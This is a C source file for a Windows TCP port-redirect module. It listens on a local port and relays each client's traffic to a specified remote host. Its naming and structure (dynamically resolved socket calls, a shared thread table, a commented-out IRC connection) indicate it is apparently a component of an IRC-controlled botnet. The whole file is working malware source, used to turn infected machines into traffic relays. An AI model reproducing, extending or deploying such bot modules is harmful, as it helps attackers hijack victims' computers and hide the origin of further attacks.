#include "includes.h"
#include "functions.h"

#ifndef NO_REDIRECT

// part of the redirect function, handles sending/recieving for the local connection.
DWORD WINAPI redirectloop2(LPVOID param)
{
	SOCKET sock;
	SOCKET csock;
	int err;
	char buff[4096];
	NTHREAD redir = *((NTHREAD*)param);
	sock = redir.sock;
	csock = redir.csock;

	while (1) {
		ZeroMemory(buff,sizeof(buff));
		err = frecv(sock, buff, sizeof(buff), 0);
		if (err == 0)
			break;
		if (err == SOCKET_ERROR)
			break;
		err = fsend(csock, buff, err, 0);
		if (err == SOCKET_ERROR)
			break;
	}

	fclosesocket(csock);
	return 0;
}
// part of the redirect function, handles sending/recieving for the remote connection.
DWORD WINAPI redirectloop(LPVOID param)
{
	SOCKET sock;
	SOCKET csock;
	char *dest;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	int port, err;
	char buff[4096];

	NTHREAD redir = *((NTHREAD*)param);
	csock = redir.csock;
	dest = redir.data1;
	port = redir.idata2;
	DWORD id;

	while (1) {
		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		ZeroMemory(&ssin,sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons(port);
		iaddr.s_addr = finet_addr(dest);
		if (iaddr.s_addr == INADDR_NONE)
			hostent = fgethostbyname(dest);
		else
			hostent = fgethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL)
			break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		err = fconnect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR)
			break;

		redir.sock = sock;
		CreateThread(NULL, 0, &redirectloop2, (void *)&redir, 0, &id);

		while (1) {
			ZeroMemory(buff,sizeof(buff));
			err = frecv(csock, buff, sizeof(buff), 0);

			if (err == 0)
				break;

			if (err == SOCKET_ERROR)
				break;

			err = fsend(sock, buff, err, 0);
			if (err == SOCKET_ERROR)
				break;

		}

		break;
	}

	fclosesocket(csock);
	fclosesocket(sock);

	return 0;
}

// port redirect function
DWORD WINAPI RedirectThread(LPVOID param)
{
	NTHREAD redir = *((NTHREAD*)param);
	NTHREAD *redirs = (NTHREAD *)param;
	redirs->gotinfo = TRUE;
	//IRC* irc=(IRC*)redir.conn;

	SOCKET rsock, clsock;
	SOCKADDR_IN rssin, cssin;
	DWORD id;

	rsock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	fWSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
	ZeroMemory(&rssin,sizeof(rssin));
	rssin.sin_family = AF_INET;
	rssin.sin_port = fhtons(redir.idata1);
	fbind(rsock, (SOCKADDR *)&rssin, sizeof(rssin));

	threads[redir.threadnum].csock=rsock;
	while(1) {
		if (flisten(rsock, 10) == SOCKET_ERROR)
			break;
		clsock = faccept(rsock, (SOCKADDR *)&cssin, NULL);
		if (clsock != INVALID_SOCKET) {
			redir.csock = clsock;
			CreateThread(NULL, 0, &redirectloop, (void *)&redir, 0, &id);
		}
	}

	fclosesocket(clsock);
	fclosesocket(rsock);
	clearthread(redir.threadnum);
	ExitThread(0);
}
#endif
